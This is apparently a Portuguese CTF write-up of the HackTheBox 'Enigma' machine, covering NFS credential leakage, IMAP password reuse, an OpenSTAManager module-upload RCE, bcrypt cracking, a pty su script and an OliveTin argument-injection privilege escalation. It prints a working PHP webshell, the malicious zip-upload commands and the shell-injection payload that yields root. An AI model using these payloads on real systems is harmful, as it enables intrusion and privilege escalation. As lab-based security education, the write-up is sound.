# Enigma

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Easy |
| **OS** | Linux |
| **IP** | 10.129.113.11 |
| **técnicas** | NFS anonymous export, IMAP password reuse, OpenSTAManager module upload RCE, hash cracking, su via pty, OliveTin argument injection |
| **link HTB** | [https://app.hackthebox.com/machines/Enigma](https://app.hackthebox.com/machines/Enigma) |

## resumo

máquina de infraestrutura de e-mail corporativo. um export NFS anônimo entrega um PDF de onboarding com credenciais de webmail. a senha reutilizada em outra caixa postal (IMAP) expõe um e-mail de TI com acesso admin ao OpenSTAManager. o módulo Updates do OpenSTAManager 2.9.8 copia o conteúdo de um zip enviado para `modules/` antes de validar qualquer coisa no banco, o que dá RCE como `www-data` com um módulo falso. o hash bcrypt do usuário `haris` no banco quebra com rockyou e a senha é reutilizada no sistema (`su` via pty, já que o SSH só aceita chave). do lado do `haris`, o painel OliveTin, rodando como root em `127.0.0.1:1337` e bloqueado por iptables para `www-data`, aceita comandos de convidado; um argumento de action interpolado sem escape em uma string de shell dá execução como root.

## enumeração/scanning

### port scanning

```bash
nmap -sC -sV -oA scans/enigma-initial 10.129.113.11
```

```text
22/tcp    open  ssh       OpenSSH 9.6p1 Ubuntu
80/tcp    open  http      nginx 1.24.0 ("Enigma Corp — Managed IT Solutions")
110/tcp   open  pop3      Dovecot pop3d
111/tcp   open  rpcbind   2-4
143/tcp   open  imap      Dovecot imapd
993/tcp   open  ssl/imap  Dovecot
995/tcp   open  ssl/pop3  Dovecot
2049/tcp  open  nfs_acl   3
```

HTTP puro não sustenta uma máquina Easy; mail (110/143/993/995) mais NFS (2049) desenha a história da box: e-mail entrega credencial, NFS entrega arquivo, SSH entrega shell.

### NFS: export anônimo

```bash
showmount -e 10.129.113.11
Export list for 10.129.113.11:
/srv/nfs/onboarding *
```

montagem precisa de root (sem `nfs-ls` do libnfs no attack box):

```bash
sudo mount -t nfs -o vers=3 10.129.113.11:/srv/nfs/onboarding /mnt/nfs
```

```text
-rw-r--r-- 1 root root 1751 New_Employee_Access.pdf
```

```bash
pdftotext -layout New_Employee_Access.pdf -
```

```text
Employee:   Kevin Mitchell
URL:        http://mail001.enigma.htb
Username:   kevin
Password:   Enigma2024!
```

credential disclosure num PDF de onboarding — o nome do export (`onboarding`) já dizia o que esperar. primeiro elo da corrente: sem credencial válida não há e-mail, e sem e-mail não há convite para o painel interno.

### web

landing estática em `enigma.htb`, só `index.html` no ffuf (`common.txt`), contato `support@enigma.htb`. vhosts revelados depois do foothold: `support_001.enigma.htb` (OpenSTAManager) e `mail001.enigma.htb` (Roundcube), ambos acessíveis via header `Host:` sem tocar no `/etc/hosts`. o enum web não rendeu nada antes da credencial, e tudo bem: a ordem certa aqui foi NFS → mail → web interno.

## exploitation

### IMAP: password reuse entre caixas postais

SSH com `kevin:Enigma2024!` falhou:

```text
kevin@10.129.113.11: Permission denied (publickey)
```

`PasswordAuthentication no` confirmado depois no `sshd_config`. mas a mesma senha serve no IMAPS:

```bash
curl -k "imaps://10.129.113.11/INBOX?ALL" --user "kevin:Enigma2024!"
* SEARCH 1
```

um e-mail de boas-vindas da sarah, sem credenciais. o teste de reuso em todas as caixas (`sarah`, `it`, `support`, `admin`, `root`) com a mesma senha: `sarah` logou.

```text
From: it@enigma.htb
Subject: Re: OpenSTAManager Access Request

URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

o e-mail do kevin era isca (mencionava "credentials via the company shared drive", o NFS que já tinhamos). a credencial real veio do reuso na caixa da sarah: testar a senha encontrada em todo usuário do mesmo serviço é barato e rendeu o convite interno.

### OpenSTAManager 2.9.8: RCE via módulo falso

login como admin em `support_001.enigma.htb` (header `Host:`). dashboard vazio, módulo Updates (id 6) presente. antes de adivinhar endpoints, fonte da versão exata:

```bash
curl -sL https://github.com/devcode-it/openstamanager/archive/refs/tags/v2.9.8.tar.gz | tar xz
```

duas leituras decisivas em `modules/aggiornamenti/upload_modules.php`:

```php
$extraction_dir = Zip::extract($_FILES['blob']['tmp_name']);
...
// branch MODULE: copia ANTES de tocar no banco
copyr(dirname($file->getRealPath()), base_dir().'/'.$directory.'/'.$info['directory']);
// insert no banco só depois
$dbo->insert($table, ...);
```

o caminho com `VERSION` no zip copia tudo para a raiz do app, mas destrói `vendor/` se o zip não traz a árvore completa. o caminho com `MODULE` copia os arquivos para `modules/<directory>/` antes de qualquer insert, e insert com falha só rollbacka o banco. RCE limpo, app intacta.

payload:

```bash
mkdir pwnmod
printf 'name = PwnMod\ndirectory = pwnmod\nversion = 1.0\ncompatibility = 2.9.8\nicon = fa fa-toolbox\nparent = Dashboard\noptions = {"type": "menu", "query": ""}\n' > pwnmod/MODULE
printf '<?php echo "PWN:".shell_exec($_REQUEST["cmd"]); ?>\n' > pwnmod/pwn.php
zip -r up.zip pwnmod
```

```bash
curl -b jar -H "Host: support_001.enigma.htb" \
  "http://10.129.113.11/controller.php?id_module=6" \
  -F "op=upload" -F "blob=@up.zip"
```

```text
http://support_001.enigma.htb/modules/pwnmod/pwn.php?cmd=id
PWN:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

caminhos que não valeram: criação de registro via `add.php` falhava em silêncio (form re-renderizado, nada no banco); anexos comuns bloqueiam `php|php5|phtml` em `OSMFilesystem` e o branch CKEditor só aceita png/jpg. o módulo falso ignora as duas checagens. ler a fonte transformou "achar o exploit do OpenSTAManager" em "entender dois `if` do código" — a ordem copy-antes-de-insert é o exploit inteiro.

## acesso como haris

### dump do banco e crack

`config.inc.php` do OpenSTAManager (www-data lê):

```text
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
```

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager \
  -e "select username,password from zz_users;"
```

```text
admin  $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris  $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

o `admin` já quebrou na mão: é o `Ne3s4rtars78s` do e-mail (reuso interno do IT). para `haris`:

```bash
hashcat -m 3200 -a 0 -w 3 haris.hash rockyou.txt
$2y$10$WHf1T79...:bestfriends
```

bateu em ~15 s a 876 H/s (GPU). a senha do sistema é `bestfriends` — hash do app de tickets, senha do login local.

### su via pty

`su` pede TTY e o webshell não tem. python `pty.fork()` decodificado no alvo por base64:

```python
pid, fd = pty.fork()
if pid == 0:
    os.execv("/bin/su", ["/bin/su", "haris", "-c", "id; cat /home/haris/user.txt"])
else:
    os.read(fd, 1024)          # "Password: "
    os.write(fd, b"bestfriends\n")
```

```text
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
```

persistência: chave ed25519 injetada em `~/.ssh/authorized_keys` no mesmo passe. SSH aceita só publickey, então a chave é o acesso estável.

**user flag:** ✓ (via `su` como haris)

## privilege escalation

### OliveTin como root atrás de iptables

como `haris`:

```text
ps aux | grep OliveTin
root  1496  /usr/local/bin/OliveTin
ss -ltnp | grep 1337
LISTEN 127.0.0.1:1337
```

config em `/etc/OliveTin/config.yaml`: `authRequireGuestsToLogin: false`, `authLocalUsers` comentado, e uma action com argumentos:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - { name: db_user, type: ascii_identifier, default: backup_svc }
    - { name: db_pass, type: password }
    - { name: db_name, type: ascii_identifier, default: production }
```

`type: password` só mascara o input na UI. na interpolação não há escape nenhum.

detalhe de pivô que custou tempo: como `www-data`, TCP para `127.0.0.1:1337` dá **timeout** (php-curl e `/dev/tcp`), não refused. como `haris`, HTTP 200. regra de `owner` no iptables bloqueia o uid 33. sinal para lembrar: timeout em localhost com o serviço vivo significa filtro, e a resposta é testar de cada usuário conquistado.

### API connect-RPC

a UI v3000 fala connect. o caminho da API (`/api/`) apareceu no bundle JS (`baseUrl: ...+"/api/"`) e os nomes das RPCs no proto do repositório (não existe `GetActions`):

```bash
curl -s -X POST 'http://127.0.0.1:1337/api/WhoAmI' \
  -H 'Content-Type: application/json' -H 'Connect-Protocol-Version: 1' -d '{}'
{"authenticatedUser":"guest", "usergroup":"guest", ...}
```

`GetDashboard` lista todas as actions com `bindingId`, argumentos e `canExec: true` para guest. `DefaultPermissions.Exec = true` é o default do produto.

detalhe que travou a execução por um ciclo: o request de `StartActionAndWait` usa o campo **`actionId`**. mandei `bindingId` primeiro; o protojson roda com `DiscardUnknown: true`, engoliu o campo, e a resposta veio HTTP 200 com log "notfound" e nenhuma execução. erro silencioso por design, só visível lendo o proto.

### injeção e root

arquivo JSON via scp (quoting de `';` dentro de `ssh -c` não sobrevive):

```json
{"actionId":"backup_database","arguments":[
  {"name":"db_user","value":"backup_svc"},
  {"name":"db_pass","value":"x'; id > /tmp/oot 2>&1; echo '"},
  {"name":"db_name","value":"production"}]}
```

```bash
curl -s -X POST 'http://127.0.0.1:1337/api/StartActionAndWait' \
  -H 'Content-Type: application/json' -H 'Connect-Protocol-Version: 1' \
  --data @/tmp/inj2.json
cat /tmp/oot
uid=0(root) gid=0(root) groups=0(root)
```

o shell montado é `mysqldump -u backup_svc -p'x'; id > /tmp/oot 2>&1; echo '' production > ...`. o `mysqldump` falha, o `id` roda como root:

```bash
# mesmo request, db_pass = "x'; cat /root/root.txt > /tmp/rt 2>&1; echo '"
```

**root flag:** ✓

três camadas independentes, cada uma silenciosa quando errada: o timeout do iptables esconde o serviço de quem não procura, o DiscardUnknown esconde o erro de campo, e a action falha "com sucesso" (HTTP 200) mesmo não executando. a defesa da máquina é a ambiguidade da resposta.

## lições aprendidas

- anonymous service enumeration primeiro, web fuzz depois: `showmount -e` custa 1 segundo e o export `onboarding` entregou a credencial inicial.
- testar a credencial encontrada em **todos** os usuários do mesmo serviço. o kevin era isca; a sarah tinha o e-mail útil.
- ler o fonte da versão exata antes de adivinhar endpoints. em OpenSTAManager, a ordem "copia o zip, depois insere no banco" só aparece no código; é o exploit inteiro.
- o branch de update com `VERSION` no zip quebra o app se o zip não traz o `vendor/` completo. o branch de módulo é o caminho seguro e o risco de danificar o alvo importa tanto quanto o RCE.
- timeout em porta de localhost com serviço vivo = filtro (iptables owner match). retestar portas locais a cada usuário novo.
- API que responde HTTP 200 com log "notfound" está descartando seu campo desconhecido. ler o proto é mais rápido que adivinhar.
- argumento `type: password` no OliveTin é mascaramento de UI, não sanitização. interpolação em `shell:` com escape manual (`'{{ x }}'`) quebra igual.
- quoting complexo não atravessa `ssh -c` nem parâmetro GET: base64 no pipe, ou arquivo + `scp` + `curl --data @file`.

---

*writeup by kp*